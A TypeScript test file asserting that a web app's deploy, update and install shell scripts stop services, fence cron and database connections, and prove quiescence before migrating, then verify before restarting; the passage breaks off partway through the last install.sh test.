import assert from 'node:assert/strict'
import { execFileSync, spawn, spawnSync } from 'node:child_process'
import { accessSync, chmodSync, constants, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'

import {
  checkoutHelper,
  checkoutPgEntry,
  FENCE_PLAN_CLUSTER,
  protectedLibraryLines,
  protectedLibraryLinesAt,
  sealCheckoutModes,
  writeCheckoutPg,
  protectedPaths,
  writeFenceCheckout,
} from './fence-artefact-harness.ts'
import { shellConstant, shellFunction, shellFunctionDefinitions } from './shell-symbol.ts'
import { createTempDirSync } from './temp-dir.ts'

// o3d-2sm1.1 — the deploy order is a safety property, not a style choice, so it is
// asserted here rather than left to the header comment that used to describe it.
//
// The old order was migrate -> build -> stop -> start, which left the PREDECESSOR
// serving the migrated schema for the whole length of a build. Two migrations
// measured what that costs: a refund-reversal witness column whose bound the old
// binary clears (unrecoverable), and a shopping-sync discriminator the old binary
// overwrites (neither repairable nor detectable). If someone reorders these phases
// back, this test fails.
//
// Everything here is line-based and skips comment lines, so a phrase quoted in a
// header comment cannot satisfy an assertion about what the script actually does.

const LOCK_LIB = join(process.cwd(), 'scripts/lib/crontab-lock.sh')

/** THE CUTOVER NAMESPACE LIBRARY (o3d-secops r22, Codex CRITICAL x2). The shared cutover lock, the
 *  app-writable connection-fence directory and the walk that creates either of them are ONE
 *  definition each now, in scripts/lib/cutover-namespace.sh, sourced by all three entrypoints.
 *  Harnesses lift a function out of the file that DEFINES it: a rig that kept asking `entry.source`
 *  for these would fail with "the script must define …", and a rig that re-typed them would prove
 *  its author can re-type them. */
const CUTOVER_NS_LIB = readFileSync(join(process.cwd(), 'scripts/lib/cutover-namespace.sh'), 'utf8')
const CUTOVER_NS_FUNCTIONS = new Set([
  'enter_service_subdir',
  'mkdir_service_subdir',
  'own_service_subdir',
  'verify_held_lock',
  'narrow_held_lock',
  'held_lock_mode',
  'lock_mode_is_private',
  'rotate_cutover_lock_inode',
  'dir_is_private_to_this_run',
  'prepare_cutover_lock_file',
  'ensure_cutover_root_dir',
  'ensure_cutover_state_dirs',
  'acquire_cutover_lock',
  'acquire_legacy_namespace_lock',
  'state_pre_r22_cutovers_are_not_excluded',
  'warn_pre_r22_db_fence_state',
  'warn_legacy_namespace_db_fence_state',
])
/** Lift `name` from whichever shipped file defines it. */
function shippedShellFunction(source: string, name: string): string {
  return shellFunction(CUTOVER_NS_FUNCTIONS.has(name) ? CUTOVER_NS_LIB : source, name)
}

/** ensure_cutover_state_dirs() and the walk it is built out of, as one lift, for the rigs that
 *  only need the connection-fence directory to exist. */
const CUTOVER_DIR_PRIMITIVES = ['enter_service_subdir', 'own_service_subdir', 'ensure_cutover_root_dir', 'ensure_cutover_state_dirs']
  .map((name) => shellFunction(CUTOVER_NS_LIB, name))
  .join('\n')
const DEPLOY_LINES = readFileSync(join(process.cwd(), 'scripts/deploy.sh'), 'utf8').split(/\r?\n/)
const UPDATE_LINES = readFileSync(join(process.cwd(), 'scripts/update.sh'), 'utf8').split(/\r?\n/)

const DEPLOY_PHASES = [
  'preflight',
  'build',
  'validate',
  'fence-writers',
  'drain-verify',
  'migrate',
  'verify-migrations',
  'start',
  'health',
  'unfence-cron',
]

function phases(lines: string[]): string[] {
  return lines
    .map((line) => /^#\s*@deploy-phase:\s*([a-z0-9-]+)\s*$/.exec(line.trim()))
    .filter((match): match is RegExpExecArray => match !== null)
    .map((match) => match[1])
}

function phaseLine(lines: string[], phase: string): number {
  const index = lines.findIndex((line) => line.trim() === `# @deploy-phase: ${phase}`)
  assert.notEqual(index, -1, `the script must declare the '${phase}' phase`)
  return index
}

function isCode(line: string): boolean {
  const trimmed = line.trim()
  return trimmed.length > 0 && !trimmed.startsWith('#')
}

/** First line of actual code (not a comment) matching `pattern`, at or after `from`. */
function codeLine(lines: string[], pattern: RegExp | string, from = 0): number {
  const matches = (line: string) => (typeof pattern === 'string' ? line.includes(pattern) : pattern.test(line))
  for (let index = from; index < lines.length; index += 1) {
    if (isCode(lines[index]) && matches(lines[index])) return index
  }
  return -1
}

test('deploy.sh builds and validates before it stops anything, and migrates only once stopped', () => {
  assert.deepEqual(phases(DEPLOY_LINES), DEPLOY_PHASES)
})

test('deploy.sh keeps the migration strictly between the stop and the start', () => {
  const at = (phase: string) => phaseLine(DEPLOY_LINES, phase)

  assert.ok(at('build') < at('fence-writers'), 'the build must run while the predecessor still serves the OLD schema')
  assert.ok(at('validate') < at('fence-writers'), 'validation must reject a release before anything is stopped')
  assert.ok(at('fence-writers') < at('drain-verify'), 'writers are stopped before quiescence is proven')
  assert.ok(at('drain-verify') < at('migrate'), 'the migration may only run once quiescence is proven')
  assert.ok(at('migrate') < at('verify-migrations'), 'verification runs after the schema has moved')
  assert.ok(at('verify-migrations') < at('start'), 'the new build starts only after every declared check returned zero')
})

test('deploy.sh arms the fence before it stops anything', () => {
  const fenceWriters = phaseLine(DEPLOY_LINES, 'fence-writers')
  const arm = codeLine(DEPLOY_LINES, 'FENCE_ARMED=true', fenceWriters)
  const stop = codeLine(DEPLOY_LINES, /systemctl stop/, fenceWriters)
  const kill = codeLine(DEPLOY_LINES, /run kill /, fenceWriters)

  assert.notEqual(arm, -1, 'the fence must be armed in the stop phase')
  assert.notEqual(stop, -1, 'the stop phase must actually stop the service')
  assert.ok(arm < stop, 'the fence must be armed before the service is stopped')
  assert.ok(arm < kill, 'the fence must be armed before any process is killed')
})

test('deploy.sh never restarts the predecessor on a post-stop failure', () => {
  const trapStart = DEPLOY_LINES.findIndex((line) => line.startsWith('on_exit() {'))
  const trapEnd = DEPLOY_LINES.findIndex((line) => line.startsWith('trap on_exit EXIT'))
  assert.ok(trapStart !== -1 && trapEnd > trapStart, 'the exit trap must exist')
  const trapBody = DEPLOY_LINES.slice(trapStart, trapEnd).filter(isCode).join('\n')

  assert.ok(!/systemctl\s+start/.test(trapBody), 'the failure path must never start the service again')
  assert.ok(!/systemctl\s+unmask/.test(trapBody), 'the failure path must never lift the fence')
  assert.ok(!/npm\s+start/.test(trapBody), 'the failure path must never relaunch the predecessor')
  assert.ok(/systemctl stop/.test(trapBody), 'the failure path re-stops rather than restarts')
})

test('deploy.sh stops processes scoped to the app directory, not every next-server on the box', () => {
  // The previous script used `pgrep -f 'next-server|next start'`, which also matched
  // the full-chain e2e instance — a different tree on a different port against a
  // different database. Scope by /proc/<pid>/cwd instead.
  const cwdScope = codeLine(DEPLOY_LINES, 'readlink -f "/proc/$pid/cwd"')
  assert.notEqual(cwdScope, -1, 'stray processes must be matched by their working directory')
  assert.notEqual(
    codeLine(DEPLOY_LINES, 'APP_DIR_REAL', cwdScope),
    -1,
    'the working-directory comparison must be against the resolved app directory',
  )
})

test('deploy.sh proves quiescence with the database, not only with the process list', () => {
  const drain = phaseLine(DEPLOY_LINES, 'drain-verify')
  const migrate = phaseLine(DEPLOY_LINES, 'migrate')
  const check = codeLine(DEPLOY_LINES, 'check-db-writers.mjs', drain)

  assert.notEqual(check, -1, 'the drain step must ask Postgres who is still connected')
  assert.ok(check < migrate, 'quiescence must be proven before the schema moves')
})

test('deploy.sh fences the cron writers once NOTHING IS SERVING, and restores them after the health check', () => {
  // THIS USED TO ASSERT `fenceCall < drain`, AND THAT ORDER WAS THE DEFECT (o3d-p9dq, Codex r26
  // HIGH). Fencing the crontab while the predecessor is still up makes the snapshot-and-replace a
  // read-modify-write racing the six server actions that reconcile the same crontab from a
  // browser: a schedule saved between the two halves went into a crontab this run then overwrote,
  // and the verbatim backup restored later did not contain it. Taking the flock there would not
  // have closed it either — on the rollout that introduces the flock the predecessor was built
  // before it existed and cannot join it. Only the stop reaches that process.
  //
  // So the fence now sits AFTER the stop, the stray sweep and the port-free proof, and still
  // BEFORE the database probe (a cron tick that opens a connection is what that probe refuses).
  const fenceWriters = phaseLine(DEPLOY_LINES, 'fence-writers')
  const drain = phaseLine(DEPLOY_LINES, 'drain-verify')
  const migrate = phaseLine(DEPLOY_LINES, 'migrate')
  const health = phaseLine(DEPLOY_LINES, 'health')

  const stop = codeLine(DEPLOY_LINES, /^\s*run systemctl stop "\$unit"$/, fenceWriters)
  assert.notEqual(stop, -1, 'the stop phase must actually stop the units')
  // …and the drain is a PROOF, not an attempt (o3d-p9dq, Codex r27 HIGH #3): the success line is
  // only reached when require_port_drained returned 0, which it does only from a socket census
  // that actually ran.
  const portFree = codeLine(DEPLOY_LINES, /^\s*ok "Port \$\{PORT\} is free, and the census that says so ran\."$/, drain)
  assert.notEqual(portFree, -1, 'the drain must prove the port is free before anything rests on it')

  const fenceCall = codeLine(DEPLOY_LINES, /^fence_cron$/, fenceWriters)
  assert.notEqual(fenceCall, -1, 'cron entries are writers and must be fenced')
  assert.ok(stop < fenceCall,
    'cron must be fenced AFTER the service is stopped: a fence taken while a browser can still '
    + 'reach the app is the lost-update this protocol exists to prevent')
  assert.ok(portFree < fenceCall,
    'and after the port is proved free, which is what makes "nothing is serving" a fact rather '
    + 'than an assumption')
  assert.ok(fenceCall < migrate, 'and before the schema moves')

  const probe = codeLine(DEPLOY_LINES, /check-db-writers\.mjs/, fenceCall)
  assert.notEqual(probe, -1, 'the database probe must still follow the cron fence')
  assert.ok(fenceCall < probe,
    'the writers are commented out first, and the probe then asks whether the room is empty')

  const unfenceCall = codeLine(DEPLOY_LINES, /^unfence_cron$/, health)
  assert.notEqual(unfenceCall, -1, 'cron must be restored once the new build has answered')
})

test('deploy.sh runs the post-migration verification hook between the migration and the start', () => {
  const verifyPhase = phaseLine(DEPLOY_LINES, 'verify-migrations')
  const start = phaseLine(DEPLOY_LINES, 'start')
  const hook = codeLine(DEPLOY_LINES, 'run-migration-verifications.mjs', verifyPhase)

  assert.notEqual(hook, -1, 'the hook must be invoked')
  assert.ok(hook < start, 'the checks must pass before the new build serves')
})

test('update.sh uses the same order: build, stop, migrate, verify, start', () => {
  assert.deepEqual(
    phases(UPDATE_LINES),
    DEPLOY_PHASES.filter((phase) => phase !== 'unfence-cron'),
  )

  const at = (phase: string) => phaseLine(UPDATE_LINES, phase)
  assert.ok(at('build') < at('fence-writers'))
  assert.ok(at('fence-writers') < at('drain-verify'))
  assert.ok(at('drain-verify') < at('migrate'))
  assert.ok(at('migrate') < at('verify-migrations'))
  assert.ok(at('verify-migrations') < at('start'))
})

test('update.sh proves quiescence and verifies migrations, and never restarts the predecessor on failure', () => {
  const drain = phaseLine(UPDATE_LINES, 'drain-verify')
  assert.notEqual(codeLine(UPDATE_LINES, 'check-db-writers.mjs', drain), -1)
  assert.notEqual(
    codeLine(UPDATE_LINES, 'run-migration-verifications.mjs', phaseLine(UPDATE_LINES, 'verify-migrations')),
    -1,
  )

  const trapStart = UPDATE_LINES.findIndex((line) => line.startsWith('on_exit() {'))
  const trapEnd = UPDATE_LINES.findIndex((line) => line.startsWith('trap on_exit EXIT'))
  assert.ok(trapStart !== -1 && trapEnd > trapStart, 'update.sh must have an exit fence too')
  const trapBody = UPDATE_LINES.slice(trapStart, trapEnd).filter(isCode).join('\n')
  assert.ok(!/systemctl\s+start/.test(trapBody))
  assert.ok(!/systemctl\s+restart/.test(trapBody))
  assert.ok(!/systemctl\s+unmask/.test(trapBody))
})

test('the pre-migration backup is taken while nothing is serving', () => {
  // A dump taken before the build is minutes stale by the time the migration runs,
  // so restoring it would silently lose every write in between.
  const drain = phaseLine(UPDATE_LINES, 'drain-verify')
  const dump = codeLine(UPDATE_LINES, /pg_dump/, 0)
  assert.notEqual(dump, -1)
  assert.ok(dump > drain, 'pg_dump must run after the writers are stopped')
})

// ---------------------------------------------------------------------------
// o3d-2sm1.2 — the fences themselves, asserted where they are ESTABLISHED rather
// than where they are described. Round 1 of the review found the reboot fence was
// installed only from the exit trap, so power loss or a SIGKILL during the migration
// bypassed it entirely, and that a re-run warned about an existing fence and then
// spent minutes rebuilding while a restarted service served the half-migrated schema.
// Both of those read correctly in the header comment at the time, which is why these
// assertions look at code lines and at ORDER.
// ---------------------------------------------------------------------------

/** Like `codeLine`, but ignores the `[DRY]` echoes that merely NAME a step. */
function realCodeLine(lines: string[], pattern: RegExp | string, from = 0): number {
  const matches = (line: string) => (typeof pattern === 'string' ? line.includes(pattern) : pattern.test(line))
  for (let index = from; index < lines.length; index += 1) {
    if (isCode(lines[index]) && !lines[index].includes('[DRY]') && matches(lines[index])) return index
  }
  return -1
}

function phaseEnd(lines: string[], phase: string): number {
  const start = phaseLine(lines, phase)
  const next = lines.findIndex((line, index) => index > start && /^#\s*@deploy-phase:/.test(line.trim()))
  return next === -1 ? lines.length : next
}

/*
 * shellFunction() and shellConstant() come from ./shell-symbol.ts, shared with
 * install-root-safe-writes.test.ts, and assert that the script defines the symbol EXACTLY ONCE
 * before handing back its text (o3d-rn10 r4).
 *
 * They are used by the durability tests below to RUN the shipped code rather than to describe it:
 * a re-implementation of the marker writer would pass while the script wrote something else, which
 * is the failure mode this whole file exists to prevent. publish_durable_file() reads
 * PUBLISH_STAGE_DIRNAME, which scripts/install.sh ALSO has to prune out of its recursive chown over
 * ${DATA_DIR}, so that name is lifted too rather than re-typed. Taking the FIRST of two definitions
 * is the same failure wearing a different hat — bash runs the LAST one — so the extractor refuses a
 * script that carries two.
 */

/**
 * The durability primitives every marker and cron-backup writer now goes through, taken
 * from the script under test.
 *
 * A harness that stubbed these would prove the writer CALLS something; the finding was
 * about what actually reaches the medium, so the shipped implementations are what run.
 */
function durabilityFunctions(source: string): string {
  return [
    // o3d-czpy: the staging directory publish_durable_file() writes through, named once.
    shellConstant(source, 'PUBLISH_STAGE_DIRNAME'),
    shellFunction(source, 'fsync_path'),
    // o3d-rn10: publish_durable_file() no longer stats its own destination pathname. It asks which
    // trusted ancestor the destination lies under and walks down from there, so all three come
    // with it — a rig missing them fails every publication with "command not found", and every
    // "the publish must fail" test then passes for the wrong reason.
    shellFunction(source, 'publish_trust_root_candidates'),
    // o3d-rn10 r4: publish_root_anchored() is a subshell around the walk, so the walk comes with it.
    shellFunction(source, 'pin_publish_root_parent'),
    shellFunction(source, 'publish_root_anchored'),
    shellFunction(source, 'publish_trust_root'),
    // o3d-secops r7: the shared refusal pin_dir_beneath_root() prints a symlinked root through.
    shellFunction(source, 'refuse_symlinked_root'),
    shellFunction(source, 'pin_dir_beneath_root'),
    shellFunction(source, 'publish_durable_file'),
    // The drop-in publisher is one of these too (o3d-2sm1.5, Codex r11): install_reboot_fence()
    // routes the systemd fragment through it, so a harness without it fails the install with
    // "command not found" and every "the install must fail" test passes for the wrong reason.
    shellFunction(source, 'publish_durable_dropin'),
    // o3d-secops r20: the marker no longer lives in ${CUTOVER_STATE_DIR}, and every writer of it
    // now creates the root-owned private directory it does live in first. Lifted here for the
    // reason the trust-root walk is: a rig missing it fails every marker publication with
    // "command not found", and every "the publish must fail" test then passes for the wrong reason.
    shellFunction(source, 'ensure_fence_marker_dir'),
  ].join('\n')
}

/**
 * THE SHARED PROTECTED-HELPER LIBRARY, SOURCED FOR REAL (o3d-2sm1.5 r31).
 *
 * scripts/lib/db-fence-protected.sh is now the only thing in the repository that decides which
 * bytes the connection fence may be executed with, and all three entrypoints source it. So the
 * harnesses source it too, rather than lifting its functions one by one: a harness that extracted
 * `db_fence_script_in_use` would keep passing if an entrypoint stopped calling it, and the finding
 * two rounds running has been precisely that one entrypoint was reading a different copy of the
 * rule.
 *
 * Its trust root is redirected at the harness directory by substituting the ONE /etc literal in
 * the shipped TEXT before it is run — not by reassigning the paths afterwards, which `readonly`
 * refuses since o3d-secops r2. Everything else about it runs unchanged, the nine paths composed
 * from that root are composed by the library itself, and the refusal to overwrite an existing
 * protected copy is the shipped one. See tests/scripts/fence-artefact-harness.ts.
 */
function fenceProtectedLibrary(dir: string): string {
  return protectedLibraryLines(dir).join('\n')
}

/** The one marker filename, in the one cutover namespace, for all three entrypoints. */
const MARKER_NAME = 'DEPLOY-FENCED'

/**
 * The regex the script's ADOPTION path greps the marker with, taken from the script itself.
 *
 * Every occurrence must be the SAME pattern: the writer confirms what it wrote with it and
 * the next run decides hold-or-release with it, and a marker written under one pattern and
 * read under another is the whole defect in a different disguise.
 */
function adoptionPredicate(source: string): string {
  const found = [...source.matchAll(/grep -qE '(\^schema_touched=true\$)'/g)].map((match) => match[1])
  assert.ok(found.length >= 2, 'the marker must be written under, and adopted through, the same predicate')
  assert.equal(new Set(found).size, 1, 'and every use of it must be identical')
  return found[0]
}

for (const [name, lines] of [
  ['deploy.sh', DEPLOY_LINES],
  ['update.sh', UPDATE_LINES],
] as const) {
  test(`${name} installs the reboot fence BEFORE it stops anything, not from the exit trap`, () => {
    const fenceWriters = phaseLine(lines, 'fence-writers')
    const install = codeLine(lines, 'install_reboot_fence', fenceWriters)
    const stop = codeLine(lines, /systemctl stop/, fenceWriters)
    const migrate = phaseLine(lines, 'migrate')

    assert.notEqual(install, -1, 'the stop phase must install the reboot fence')
    assert.ok(install < stop, 'the fence must be installed before the service is stopped')
    assert.ok(install < migrate, 'the fence must be installed before the schema can move')
  })

  test(`${name} verifies the reboot fence took rather than assuming the command worked`, () => {
    const source = lines.join('\n')
    assert.match(
      source,
      /systemctl show -p DropInPaths/,
      'installation must be checked against what systemd actually loaded',
    )
    assert.match(source, /AssertPathExists=!/, 'the fence must be a condition systemd enforces on start')
    // `systemctl mask` cannot mask a unit whose own file lives in /etc/systemd/system,
    // and --runtime masking is erased by the reboot it is meant to survive.
    assert.ok(
      !/^\s*(run )?systemctl mask\b/m.test(source),
      'the reboot fence must not be systemctl mask; it does not work for a locally-defined unit',
    )
  })

  test(`${name} fails the deploy when the fence cannot be verified`, () => {
    // THIS USED TO BE `assert.match(fourLines, /\|\||die/)`, which any `||` in the window
    // satisfies — `|| true` included. So it asserted that the shell contains a pipe symbol.
    // What has to be true is that the call's OWN continuation is a `die`, so read the
    // continuation: from the call line, follow backslash-continued lines, and require that
    // what they contain is `|| die` and not `|| warn`, `|| true` or a bare `||`.
    const fenceWriters = phaseLine(lines, 'fence-writers')
    const install = codeLine(lines, 'install_reboot_fence', fenceWriters)
    assert.notEqual(install, -1, 'the stop phase must install the reboot fence')

    let continuation = lines[install]
    let index = install
    while (/\\\s*$/.test(lines[index]) && index + 1 < lines.length) {
      index += 1
      continuation += `\n${lines[index]}`
    }
    assert.match(continuation, /\|\|\s*(\\\s*\n\s*)?die\b/, 'an unverifiable fence must `die`, not warn or `|| true`')
    assert.ok(
      !/\|\|\s*(true|:|warn|info)\b/.test(continuation),
      'and the guard must not be satisfied by a no-op continuation',
    )
  })

  test(`${name} adopts an existing fence before it pulls, installs or builds`, () => {
    const preflight = phaseLine(lines, 'preflight')
    const build = phaseLine(lines, 'build')

    const stop = codeLine(lines, /systemctl stop/, preflight)
    const reinstall = codeLine(lines, 'install_reboot_fence', preflight)
    const cron = codeLine(lines, 'adopt_cron_fence', preflight)
    const release = codeLine(lines, 'release_db_connections', preflight)

    for (const [what, at] of [
      ['re-stop the service', stop],
      ['re-establish the reboot fence', reinstall],
      ['confirm the cron fence', cron],
      ['release any standing connection fence', release],
    ] as const) {
      assert.notEqual(at, -1, `adoption must ${what}`)
      assert.ok(at < build, `adoption must ${what} BEFORE the build phase`)
    }
  })

  test(`${name} fences connections continuously, before the snapshot and before the schema moves`, () => {
    const drain = phaseLine(lines, 'drain-verify')
    const fence = realCodeLine(lines, 'fence_db_connections', drain)
    const probe = realCodeLine(lines, 'check-db-writers.mjs', drain)
    const migrate = phaseLine(lines, 'migrate')

    assert.notEqual(fence, -1, 'the drain must shut the door, not only look through it')
    assert.ok(fence < probe, 'the fence goes up before the snapshot is taken')
    assert.ok(probe < migrate, 'and both happen before the schema moves')

    const trapStart = lines.findIndex((line) => line.startsWith('on_exit() {'))
    const trapEnd = lines.findIndex((line) => line.startsWith('trap on_exit EXIT'))
    const trapBody = lines.slice(trapStart, trapEnd).filter(isCode).join('\n')
    assert.match(
      trapBody,
      /release_db_connections/,
      'a revoke nobody undoes is an application that cannot reach its database',
    )
    assert.match(trapBody, /install_reboot_fence/, 'the trap re-establishes the reboot fence it may have lifted')
  })

  // -------------------------------------------------------------------------
  // o3d-2sm1.3 (Codex r2, CRITICAL) — the failure and adoption paths were reopening
  // the database before the schema was known to be safe. The trap released CONNECT
  // after ANY post-stop failure, a failed or interrupted migration included, and
  // adoption released it too — so the application could reconnect to a schema in an
  // unknown state, which is the exact window this branch exists to close.
  //
  // The tension that must not be traded away: the earlier round put the release in the
  // trap so a failure could not leave the database unreachable, and that is still right
  // for failures BEFORE any migration attempt. The distinction is whether the schema
  // was touched, so these assert the CONDITION, not the presence of a call.
  // -------------------------------------------------------------------------

  test(`${name} tracks "the schema may have moved" separately from "this run intends to migrate"`, () => {
    const source = lines.filter(isCode).join('\n')
    assert.match(source, /^SCHEMA_TOUCHED=false$/m, 'the flag must start false')
    assert.match(source, /schema_touched=\$\{SCHEMA_TOUCHED\}/, 'and be recorded in the marker for the next run')

    // Set BEFORE the migration command, never after: an interrupted or half-applied
    // migration is precisely the case it exists for. And set by mark_schema_touched, which
    // also PERSISTS it — see the durability tests below.
    const mark = realCodeLine(lines, /^\s*mark_schema_touched$/, phaseLine(lines, 'migrate'))
    const migrateCmd = realCodeLine(lines, 'prisma migrate deploy', phaseLine(lines, 'migrate'))
    assert.notEqual(mark, -1, 'the migrate phase must record that the schema may have moved')
    assert.ok(mark < migrateCmd, 'the flag must be set before `prisma migrate deploy` is invoked, not after it returns')

    const marker = shellFunction(lines.join('\n'), 'mark_schema_touched')
    assert.match(marker, /^\s*SCHEMA_TOUCHED=true$/m, 'and mark_schema_touched is where the flag is raised')
  })

  test(`${name} holds the connection fence on a failure after the migration started, and releases it before`, () => {
    const trapStart = lines.findIndex((line) => line.startsWith('on_exit() {'))
    const trapEnd = lines.findIndex((line) => line.startsWith('trap on_exit EXIT'))
    const trapBody = lines.slice(trapStart, trapEnd)

    const release = trapBody.findIndex((line) => isCode(line) && /release_db_connections/.test(line))
    assert.notEqual(release, -1, 'a failure that never touched the schema must still release the fence')

    // The branch the release actually sits in: walk back from it to the nearest `else`,
    // and from there to the `if` that opened it. Anything else would assert only that
    // the two strings appear in the same function.
    const lastCodeBefore = (from: number, pattern: RegExp): number => {
      for (let index = from - 1; index >= 0; index -= 1) {
        if (isCode(trapBody[index]) && pattern.test(trapBody[index])) return index
      }
      return -1
    }
    const elseAt = lastCodeBefore(release, /^\s*else$/)
    assert.notEqual(elseAt, -1, 'the release must sit in the ELSE of a guard, not run unconditionally')
    const guard = lastCodeBefore(elseAt, /^\s*if \$SCHEMA_TOUCHED; then$/)
    assert.notEqual(
      guard,
      -1,
      'and that guard must be $SCHEMA_TOUCHED: holding is what happens once the schema may have moved',
    )
    assert.match(
      trapBody.join('\n'),
      /DELIBERATELY LEFT UP/,
      'a held fence must say it is held on purpose and how to undo it by hand',
    )
  })

  test(`${name} adopts a held connection fence instead of releasing it, and recovers through the admin connection`, () => {
    const preflight = phaseLine(lines, 'preflight')
    const build = phaseLine(lines, 'build')

    const readsFlag = codeLine(lines, "schema_touched=true", preflight)
    assert.notEqual(readsFlag, -1, 'adoption must read whether the previous run had started migrating')
    assert.ok(readsFlag < build, 'and read it before anything is rebuilt')

    const adopt = codeLine(lines, 'adopt_db_connections', preflight)
    assert.notEqual(adopt, -1, 'a fence left standing after a migration attempt is adopted, not released')
    assert.ok(adopt < build, 'adoption happens before the rebuild, which runs inside the held fence')

    const source = lines.filter(isCode).join('\n')
    assert.match(
      source,
      /DEPLOY_ADMIN_DATABASE_URL is not set/,
      'adopting a held fence without a privileged connection must fail loudly, not proceed',
    )
    assert.match(
      source,
      /MIGRATION_DATABASE_URL/,
      'every recovery step that needs the database goes through the admin connection',
    )
  })

  test(`${name} lifts the connection fence before it starts the new build`, () => {
    const start = phaseLine(lines, 'start')
    const release = codeLine(lines, 'release_db_connections', start)
    const startService = codeLine(lines, /systemctl start/, start)
    assert.notEqual(release, -1, 'the fence must come down in the start phase')
    assert.ok(release < startService, 'the application cannot serve a database it may not connect to')
  })
}

test('update.sh records a backup path only once pg_dump has succeeded', () => {
  // The failure banner names BACKUP_FILE as the restore point. Setting it before the
  // dump advertised a partial file as a restore point whenever pg_dump failed.
  const migrate = phaseLine(UPDATE_LINES, 'migrate')
  const dump = codeLine(UPDATE_LINES, /pg_dump/, migrate)
  const assign = codeLine(UPDATE_LINES, /^BACKUP_FILE="/, migrate)

  assert.notEqual(dump, -1)
  assert.equal(assign, -1, 'BACKUP_FILE must not be assigned a path before the dump runs')

  const body = UPDATE_LINES.slice(migrate, phaseEnd(UPDATE_LINES, 'migrate')).filter(isCode).join('\n')
  assert.match(body, /\.part/, 'the dump must land on a partial name first')
  assert.match(body, /BACKUP_FILE="\$\{BACKUP_TARGET\}"/, 'and be adopted only after it completes')

  const trapStart = UPDATE_LINES.findIndex((line) => line.startsWith('on_exit() {'))
  const trapEnd = UPDATE_LINES.findIndex((line) => line.startsWith('trap on_exit EXIT'))
  const trapBody = UPDATE_LINES.slice(trapStart, trapEnd).join('\n')
  assert.match(
    trapBody,
    /NO usable pre-migration dump/,
    'and the failure path must say what to do when there is no restore point',
  )
})

// ---------------------------------------------------------------------------
// o3d-2sm1.3 (Codex r2, HIGH) — `--restart-only` could start after a failed migration.
//
// Adoption read that a migration had been attempted and preserved the reboot mask, but
// never rejected the flags that skip the migration. A re-run after a failed migration or
// a failed verification could therefore start the service having re-run NEITHER — against
// exactly the half-applied schema the fence exists to keep it away from.
// ---------------------------------------------------------------------------

test('deploy.sh refuses --skip-migrate and --restart-only while adopting a migration attempt', () => {
  const preflight = phaseLine(DEPLOY_LINES, 'preflight')
  const build = phaseLine(DEPLOY_LINES, 'build')

  const guard = codeLine(DEPLOY_LINES, /if \$FENCE_MASK && \$SKIP_MIGRATE; then/, preflight)
  assert.notEqual(guard, -1, 'adoption must reject a run that would skip the migration')
  assert.ok(guard < build, 'and reject it before spending minutes on a build it will not be allowed to start')

  const refusal = DEPLOY_LINES.slice(guard, guard + 4).join('\n')
  assert.match(refusal, /\bdie\b/, 'the refusal must stop the run, not warn')
  assert.match(refusal, /--skip-migrate|SKIP_MIGRATE_FLAG/, 'and name the flag the operator typed')

  // --restart-only is --skip-build plus --skip-migrate, so it is caught by the same
  // guard; the message has to be able to say which one was typed.
  assert.match(
    DEPLOY_LINES.join('\n'),
    /--restart-only\) SKIP_BUILD=true; SKIP_MIGRATE=true; SKIP_MIGRATE_FLAG="--restart-only"/,
    '--restart-only must record itself as the flag that will be refused',
  )
})

test('deploy.sh still allows --skip-build on a re-run, because the build on disk is the NEW one', () => {
  // The rebuild happens before the stop, so a fence adopted after a failed migration
  // already has the new artefact on disk. Refusing --skip-build would make every
  // recovery pay for a build it does not need; refusing --skip-migrate is what matters.
  const source = DEPLOY_LINES.filter(isCode).join('\n')
  assert.ok(
    !/\$FENCE_MASK && \$SKIP_BUILD/.test(source),
    '--skip-build must not be swept into the same refusal',
  )
})

// ---------------------------------------------------------------------------
// o3d-2sm1.3 — install.sh is a SUPPORTED UPGRADE ENTRYPOINT with the original defect.
//
// It explicitly supports being re-run over an existing installation — it reads back the
// previous .env, preserves the secrets it cannot re-mint, keeps a working REDIS_URL —
// and it migrated while the existing service and cron writers were live. That is the
// same defect deploy.sh and update.sh had, on the path most likely to be used by someone
// who does not know the deploy order.
// ---------------------------------------------------------------------------

const INSTALL_LINES = readFileSync(join(process.cwd(), 'scripts/install.sh'), 'utf8').split(/\r?\n/)

test('install.sh detects an existing installation and stops every writer before it migrates', () => {
  const cutover = codeLine(INSTALL_LINES, /^if upgrade_in_place; then$/)
  assert.notEqual(cutover, -1, 'a re-run over an existing installation must be detected')

  const migrate = realCodeLine(INSTALL_LINES, 'prisma migrate deploy', cutover)
  const fence = realCodeLine(INSTALL_LINES, 'install_reboot_fence', cutover)
  const stop = realCodeLine(INSTALL_LINES, /systemctl stop/, cutover)
  const cron = realCodeLine(INSTALL_LINES, /^  fence_cron$/, cutover)
  const dbFence = realCodeLine(INSTALL_LINES, /^  fence_db_connections$/, cutover)
  const probe = realCodeLine(INSTALL_LINES, 'check-db-writers.mjs', cutover)

  for (const [what, at] of [
    ['install the reboot fence', fence],
    ['stop the service', stop],
    ['fence the cron writers', cron],
    ['revoke CONNECT for the window', dbFence],
    ['prove nothing else is connected', probe],
  ] as const) {
    assert.notEqual(at, -1, `the upgrade cutover must ${what}`)
    assert.ok(at < migrate, `it must ${what} BEFORE the schema moves`)
  }
  assert.ok(fence < stop, 'the reboot fence is installed before the stop, not on the way out')
  assert.ok(dbFence < probe, 'the fence shuts the door before the probe asserts the room is empty')
})

test('install.sh verifies its reboot fence with systemd and never uses systemctl mask', () => {
  const source = INSTALL_LINES.join('\n')
  assert.match(source, /systemctl show -p DropInPaths/, 'the drop-in must be checked against what systemd loaded')
  assert.match(source, /AssertPathExists=!/, 'the fence must be a condition systemd enforces on start')
  assert.ok(
    !/^\s*systemctl mask\b/m.test(source),
    'a mask cannot work for a unit whose own file lives in /etc/systemd/system',
  )
})

test('install.sh runs the post-migration verification hook before it starts anything', () => {
  const hook = realCodeLine(INSTALL_LINES, 'run-migration-verifications.mjs')
  const start = realCodeLine(INSTALL_LINES, /^systemctl start /)
  assert.notEqual(hook, -1, 'the installer must run the migrations\' own checks too')
  assert.ok(hook < start, 'and pass them before the service is started')
})

test('install.sh lifts the fences immediately before the start, and restores cron after it', () => {
  const start = realCodeLine(INSTALL_LINES, /^systemctl start /)
  const release = realCodeLine(INSTALL_LINES, /^release_db_connections \\$/)
  const removeFence = realCodeLine(INSTALL_LINES, /^remove_reboot_fence$/)
